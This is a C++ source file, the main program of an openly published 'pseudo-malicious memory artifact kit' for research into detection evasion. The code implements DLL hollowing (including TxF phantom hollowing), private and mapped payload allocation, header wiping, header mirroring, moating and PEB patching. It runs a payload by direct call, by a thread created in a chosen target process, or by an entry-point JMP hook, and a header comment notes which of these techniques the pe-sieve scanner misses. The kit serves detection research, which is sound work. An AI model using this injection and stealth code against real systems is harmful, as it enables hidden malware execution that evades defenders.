/*
____________________________________________________________________________________________________
|                __  .__  _____               __     __   .__  __                                  |
| _____ ________/  |_|__|/ ____\____    _____/  |_  |  | _|__|/  |_                                |
| \__  \\_  __ \   __\  \   __\\__  \ _/ ___\   __\ |  |/ /  \   __\                               |
|  / __ \|  | \/|  | |  ||  |   / __ \\  \___|  |   |    <|  ||  |                                 |
| (____  /__|   |__| |__||__|  (____  /\___  >__|   |__|_ \__||__|                                 |
|      \/                           \/     \/            \/                                        |
|__________________________________________________________________________________________________|
| Pseudo-malicious memory artifact kit                                                             |
|--------------------------------------------------------------------------------------------------|
| https://www.forrest-orr.net/post/masking-malicious-memory-artifacts-part-ii-insights-from-moneta |
|--------------------------------------------------------------------------------------------------|
| Author: Forrest Orr - 2020                                                                       |
|--------------------------------------------------------------------------------------------------|
| Contact: forrest.orr@protonmail.com                                                              |
|--------------------------------------------------------------------------------------------------|
| Licensed under GNU GPLv3                                                                         |
|__________________________________________________________________________________________________|
| ## Features                                                                                      |
|                                                                                                  |
| ~ Generate dynamic image, mapped and private memory                                              |
| ~ Bootstrap PE files                                                                             |
| ~ Phantom and classic DLL hollowing                                                              |
| ~ Moating, header wiping, and header mirroring                                                   |
|__________________________________________________________________________________________________|

*/

/* Results

   - pe-sieve

     ~ DLL hollowing (.text) on a mapped module:

	   Detected as a hooked module with 14 total patches.
	   Undetected if the module is unmodified (being unlinked from the PEB loaded modules list is not a detection criteria).

	 ~ DLL hollowing (.text) on a TxF mapped module:

	   Detected as an "implanted" module (due to not being a listed module?)
	   It is also detected as implanted when unmodified. It must be that the private status of the pages in the working set are what distinguish this as implanted?

	 ~ DLL hollowing (.text) on a loaded module:

	   Detected as a hooked module with 14 total patches. Same exact result as mapped hollowing. It seems that due to a bug in pe-sieve a hooked module is not checked for a corresponding PEB list entry.

	 ~ Private +RWX shellcode:

	   No detections. This is likely due to the fact that shellcode detection criteria is based on code patterns and lack of a PE header in image ranges of memory. This is also the case when /data is used.
*/
#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <winternl.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <Dbghelp.h>
#include <string>
#include <vector>
#include <algorithm>
#include <memory>

#include "Allocation.h"
#include "Resources.h"
#include "Stealth.h"

using namespace std;

#pragma comment(lib, "Dbghelp.lib")

enum class Allocation_t {
	Invalid = 0,
	DllMapHollow,
	DllLoadHollow,
	DllTxfMapHollow,
	Private,
	Mapped
};

enum class ExecutionMethod {
	Invalid = 0,
	Call,
	CreateThread,
	EntryPointHook
};

typedef void(*fnAddr)();

int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
	vector<wstring> Args(&pArgv[0], &pArgv[0 + nArgc]);
	HMODULE	hSelfModule = GetModuleHandleA(nullptr);

	//
	// Interface/usage
	//

	if (nArgc < 3) {
		HMODULE	hSelfModule = GetModuleHandleA(nullptr);
		HRSRC hResourceInfo;
		HGLOBAL hResourceData;
		char* pRsrcData = nullptr;
		uint32_t dwRsrcSize;

		if ((hResourceInfo = FindResourceA(hSelfModule, IDR_USAGE_TEXT_NAME, RT_RCDATA))) {
			if ((hResourceData = LoadResource(hSelfModule, hResourceInfo))) {
				dwRsrcSize = SizeofResource(hSelfModule, hResourceInfo);
				pRsrcData = (char*)LockResource(hResourceData);
				unique_ptr<uint8_t[]> RsrcBuf = make_unique<uint8_t[]>(dwRsrcSize + 1); // Otherwise the resource text may bleed in to the rest of the .rsrc section
				memcpy(RsrcBuf.get(), pRsrcData, dwRsrcSize);
				printf("%s\r\n", pRsrcData);
				system("Pause");
			}
		}
	}
	else {
		wstring PayloadFilePath, HollowDllFilePath;
		Allocation_t SelectedAllocType = Allocation_t::Invalid;
		Payload_t SelectedPayloadType = Payload_t::Invalid;
		ExecutionMethod SelectedExecMethod = ExecutionMethod::Call;
		uint64_t qwImplantFlags = 0;
		uint32_t dwTargetPid = GetCurrentProcessId();
		uint32_t dwMoatSize = 0;
		bool bTargetSelf = true;

		for (vector<wstring>::const_iterator ItrArg = Args.begin(); ItrArg != Args.end(); ++ItrArg) {
			wstring Arg = *ItrArg;
			transform(Arg.begin(), Arg.end(), Arg.begin(), ::tolower);

			if (Arg == L"--alloc-type") {
				if (*(ItrArg + 1) ==  L"dll-map-hollow") {
					SelectedAllocType = Allocation_t::DllMapHollow;
					qwImplantFlags |= IMPLANT_FLAG_ISOLATED_MAP;
				}
				else if (*(ItrArg + 1) ==  L"dll-load-hollow") {
					SelectedAllocType = Allocation_t::DllLoadHollow;
				}
				else if (*(ItrArg + 1) ==  L"txf-dll-map-hollow") {
					SelectedAllocType = Allocation_t::DllTxfMapHollow;
					qwImplantFlags |= IMPLANT_FLAG_TXF;
					qwImplantFlags |= IMPLANT_FLAG_ISOLATED_MAP;
				}
				else if (*(ItrArg + 1) ==  L"private") {
					SelectedAllocType = Allocation_t::Private;
					qwImplantFlags |= IMPLANT_FLAG_MEM_PRIVATE;
				}
				else if (*(ItrArg + 1) == L"mapped") {
					SelectedAllocType = Allocation_t::Mapped;
					qwImplantFlags |= IMPLANT_FLAG_MEM_MAPPED;
				}
			}
			else if (Arg == L"--exec-method") {
				if (*(ItrArg + 1) == L"call") {
					SelectedExecMethod = ExecutionMethod::Call;
				}
				else if (*(ItrArg + 1) == L"create-thread") {
					SelectedExecMethod = ExecutionMethod::CreateThread;
				}
				else if (*(ItrArg + 1) == L"ep-jmp-hook") {
					SelectedExecMethod = ExecutionMethod::EntryPointHook;
				}
			}
			else if (Arg == L"--target-pid") {
				dwTargetPid = _wtoi((*(ItrArg + 1)).c_str());
				bTargetSelf = false;
			}
			else if (Arg == L"--moat-size") {
				dwMoatSize = _wtoi((*(ItrArg + 1)).c_str());
			}
			else if (Arg == L"--payload-type") {
				if (*(ItrArg + 1) == L"pe") {
					SelectedPayloadType = Payload_t::PE;
				}
				else if (*(ItrArg + 1) == L"shellcode") {
					SelectedPayloadType = Payload_t::Shellcode;
				}
			}
			else if (Arg == L"--payload-file") {
				PayloadFilePath = *(ItrArg + 1);
			}
			else if (Arg == L"--hollow-dll-file") {
				HollowDllFilePath = *(ItrArg + 1);
			}
			else if (Arg == L"--stealth") {
				for (vector<wstring>::const_iterator ItrOpt = (ItrArg + 1); ItrOpt != Args.end(); ++ItrOpt) {
					wstring Option = *ItrOpt;

					transform(Option.begin(), Option.end(), Option.begin(), ::tolower);

					if (Option == L"wipe-headers") {
						qwImplantFlags |= IMPLANT_FLAG_WIPE_PE_HDR;
					}
					else if (Option == L"rw-rx") {
						qwImplantFlags |= IMPLANT_FLAG_RW_RX;
					}
					else if (Option == L"mirror-headers") {
						qwImplantFlags |= IMPLANT_FLAG_MIRROR_PE_HDR;
					}
					else if (Option == L"dotnet") {
						qwImplantFlags |= IMPLANT_FLAG_DOTNET;
					}
					else if (Option == L"moat") {
						qwImplantFlags |= IMPLANT_FLAG_MOAT;
					}
					else if (Option == L"peb-img-base") {
						qwImplantFlags |= IMPLANT_FLAG_PEB_IMAGE_BASE;
					}
				}
			}
		}

		//
		// Validate input arguments/combinations
		//

		if (SelectedAllocType == Allocation_t::Invalid) { // Allocation type is required
			printf("... invalid allocation type specified.\r\n");
			return 0;
		}

		if (!PayloadFilePath.empty()) { // In the event that a payload file is specified, a type and call method must also be selected
			if (SelectedExecMethod == ExecutionMethod::Invalid) {
				printf("... a valid execution method is required in conjunction with a payload.\r\n");
				return 0;
			}

			if (SelectedPayloadType == Payload_t::Invalid) {
				printf("... a valid payload type is required in conjunction with a payload.\r\n");
				return 0;
			}
		}
		
		if (SelectedPayloadType == Payload_t::Invalid) {
			SelectedPayloadType = Payload_t::None;
		}

		if (SelectedAllocType == Allocation_t::Mapped || SelectedAllocType == Allocation_t::Private) {
			if ((qwImplantFlags & IMPLANT_FLAG_DOTNET)) {
				printf("... the .NET stealth option is only valid for allocations made using hollowed image mappings.\r\n");
				return 0;
			}

			if (SelectedPayloadType == Payload_t::Shellcode) {
				if ((qwImplantFlags & (IMPLANT_FLAG_WIPE_PE_HDR | IMPLANT_FLAG_MIRROR_PE_HDR))) {
					printf("... the header mirroring/wiping stealth options are only valid for hollowed image map allocations, or non-image allocations using a PE payload.\r\n");
					return 0;
				}
			}

			if (!HollowDllFilePath.empty()) {
				printf("... manual selection of a DLL to hollow is only applicable to a DLL hollowing allocation tyoe.\r\n");
				return 0;
			}
		}
		else {
			if ((qwImplantFlags & IMPLANT_FLAG_RW_RX)) {
				printf("... the RW -> RX stealth option is only valid for allocations made using private and mapped memory.\r\n");
				return 0;
			}

			if ((qwImplantFlags & IMPLANT_FLAG_MOAT)) { // Since the PE must be valid at the time it is used to create a section with TxF (it is not re-written after being mapped) the PE cannot be moated.
				if (SelectedAllocType == Allocation_t::DllTxfMapHollow) {
					printf("... the moating stealth option is not valid in conjunction with the TxF hollowed DLL allocation type.\r\n");
					return 0;
				}
			}

			if (SelectedPayloadType == Payload_t::Shellcode) {
				if ((qwImplantFlags & IMPLANT_FLAG_MOAT)) {
					//printf("... the moating stealth option is not valid for shellcode implants within hollowed DLL allocation types.\r\n");
					//return 0;

					if ((qwImplantFlags & IMPLANT_FLAG_TXF)) {
						printf("... the moating stealth option is not valid for shellcode implants within TxF hollowed DLL allocation types.\r\n");
						return 0;
					}
				}
			}
		}

		if ((qwImplantFlags & IMPLANT_FLAG_MOAT) && !dwMoatSize) { // Moat stealth option was used but no moat size provided. Use the default.
			dwMoatSize = DEFAULT_MOAT_SIZE;
		}

		//
		// Initialization based upon selected options
		//

		printf("... initializing artifacts for target PID %d\r\n", dwTargetPid);

		HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, false, dwTargetPid);
		HANDLE hFile = INVALID_HANDLE_VALUE;
		uint32_t dwFileSize = 0;
		uint8_t* pFileBuf = nullptr;
		uint32_t dwBytesRead;
		uint8_t* pAllocatedRegion = nullptr;

		if (!PayloadFilePath.empty()) {
			if ((hFile = CreateFileW(PayloadFilePath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr)) != INVALID_HANDLE_VALUE) {
				dwFileSize = GetFileSize(hFile, nullptr);
				pFileBuf = new uint8_t[dwFileSize];
				printf("... successfully opened %ws (size: %d)\r\n", PayloadFilePath.c_str(), dwFileSize);
				ReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesRead, nullptr);
			}
			else {
				printf("... failed to open %ws (error %d)\r\n", PayloadFilePath.c_str(), GetLastError());
				return 0;
			}
		}
		else {
			dwFileSize = 0x1000; // For blank regions simply allocate one page worth of memory.
		}

		if ((qwImplantFlags & IMPLANT_FLAG_TXF) && GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateTransaction") == nullptr) {
			qwImplantFlags &= ~IMPLANT_FLAG_TXF;
			printf("... TxF is not handled on this system. Disabling preference.\r\n");
		}

		//
		// Perform payload implant
		//

		uint8_t* pTargetEntryPoint = nullptr;
		uint8_t* pImplantAddress = nullptr;

		switch (SelectedAllocType) {
			case Allocation_t::DllMapHollow:
			case Allocation_t::DllLoadHollow:
			case Allocation_t::DllTxfMapHollow: {
				uint64_t qwMapBufSize;

				if (HollowDllFilePath.empty()) {
					wchar_t SearchDir[MAX_PATH + 1] = { 0 };

					if ((qwImplantFlags & IMPLANT_FLAG_DOTNET)) {
						GetWindowsDirectoryW(SearchDir, MAX_PATH);
					}
					else {
						GetSystemDirectoryW(SearchDir, MAX_PATH);
					}

					if (HollowDllScan(SearchDir, &pAllocatedRegion, &qwMapBufSize, pFileBuf, dwFileSize, &pTargetEntryPoint, SelectedPayloadType, qwImplantFlags, dwMoatSize)) {
						printf("... successfully mapped an image to hollow at 0x%p (size: %I64u bytes)\r\n", pAllocatedRegion, qwMapBufSize);
						pImplantAddress = (pAllocatedRegion + dwMoatSize); // Moat should only be allowed to be non-zero for image map and image load DLL hollowing with a PE payload.
					}
					else {
						printf("... failed to allocate payload region via hollowed image mapping implant (finished scanning Windows folder)\r\n");
					}
				}
				else {
					if (HollowDllImplant(HollowDllFilePath .c_str(), &pAllocatedRegion, &qwMapBufSize, pFileBuf, dwFileSize, &pTargetEntryPoint, SelectedPayloadType, qwImplantFlags, dwMoatSize)) {
						printf("... successfully mapped an image of %ws to hollow at 0x%p (size: %I64u bytes)\r\n", HollowDllFilePath.c_str(), pAllocatedRegion, qwMapBufSize);
						pImplantAddress = (pAllocatedRegion + dwMoatSize);
					}
					else {
						printf("... failed to allocate payload region via hollowed image mapping of %ws\r\n", HollowDllFilePath.c_str());
					}
				}

				break;
			}
			case Allocation_t::Mapped:
			case Allocation_t::Private: {
				if ((pTargetEntryPoint = DynamicAllocImplant(hProcess, (bTargetSelf ? false : true), pFileBuf, dwFileSize, SelectedPayloadType, qwImplantFlags, &pAllocatedRegion, dwMoatSize)) != nullptr) {
					pImplantAddress = (pAllocatedRegion + dwMoatSize);
				}

				break;
			}
		}

		if ((qwImplantFlags & IMPLANT_FLAG_PEB_IMAGE_BASE) && pImplantAddress != nullptr) {
			void *pOldImageBase = UpdatePebImageBase(pImplantAddress);
			printf("... updated the image base field of the PEB from 0x%p to 0x%p\r\n", pOldImageBase, pImplantAddress); // The implant address may not be the same as the allocation base when moating is used.
		}

		if (pTargetEntryPoint != nullptr) { // Blank regions should not be executed
			if (SelectedExecMethod == ExecutionMethod::Call) {
				printf("... calling 0x%p...\r\n", pTargetEntryPoint);
				((fnAddr)pTargetEntryPoint)();
			}
			else if (SelectedExecMethod == ExecutionMethod::CreateThread) {
				printf("... creating thread at 0x%p...\r\n", pTargetEntryPoint);

				if (!bTargetSelf) {
					CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pTargetEntryPoint, nullptr, 0, nullptr);
				}
				else {
					CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)pTargetEntryPoint, nullptr, 0, nullptr);
				}

				//system("pause");
			}
			else if (SelectedExecMethod == ExecutionMethod::EntryPointHook) {
				IMAGE_NT_HEADERS* pNtHdrs = ImageNtHeader(hSelfModule);
				SIZE_T cbBytesWritten = 0;
				uint8_t* pCurrentEntryPoint = reinterpret_cast<uint8_t*>(hSelfModule + pNtHdrs->OptionalHeader.AddressOfEntryPoint);
#ifdef _WIN64
				uint8_t DetourPatch[] =
				{
					0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Mov Rax, Constant64
					0xFF, 0xE0 // Jmp Rax - Call shellcode via absolute address in Rax
				};
				uint32_t dwDetourPatchSize = sizeof(DetourPatch);
				uint8_t* NewDetourPatch = new uint8_t[dwDetourPatchSize];

				memcpy(NewDetourPatch, DetourPatch, dwDetourPatchSize);
				*(uint64_t*)&NewDetourPatch[2] = (uint64_t)pTargetEntryPoint;
#else
				uint8_t DetourPatch[] =
				{
					0xB8, 0x00, 0x00, 0x00, 0x00, // Mov Eax, Constant32
					0xFF, 0xE0 // Jmp Eax - Call shellcode via absolute address in Eax
				};
				uint32_t dwDetourPatchSize = sizeof(DetourPatch);
				uint8_t* NewDetourPatch = new uint8_t[dwDetourPatchSize];

				memcpy(NewDetourPatch, DetourPatch, dwDetourPatchSize);
				*(uint32_t*)&NewDetourPatch[1] = (uint32_t)pTargetEntryPoint;
#endif
				printf("... patching entry point of current process primary EXE module at 0x%p\r\n", pCurrentEntryPoint);

				if (WriteProcessMemory(GetCurrentProcess(), pCurrentEntryPoint, NewDetourPatch, dwDetourPatchSize, &cbBytesWritten)) {
					printf("... successfully wrote %d bytes to entry point of current process primary EXE module at 0x%p\r\n", cbBytesWritten, pCurrentEntryPoint);
				}
				else {
					printf("... failed to write JMP hook to entry point of current process primary EXE module at 0x%p\r\n", pCurrentEntryPoint);
				}

				delete[] NewDetourPatch;
				printf("... calling entry point at 0x%p...\r\n", pCurrentEntryPoint);
				((fnAddr)pCurrentEntryPoint)();
			}
		}

		if(pFileBuf != nullptr) delete[] pFileBuf;
		if(hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
	}

	//system("pause");
	return 0;
}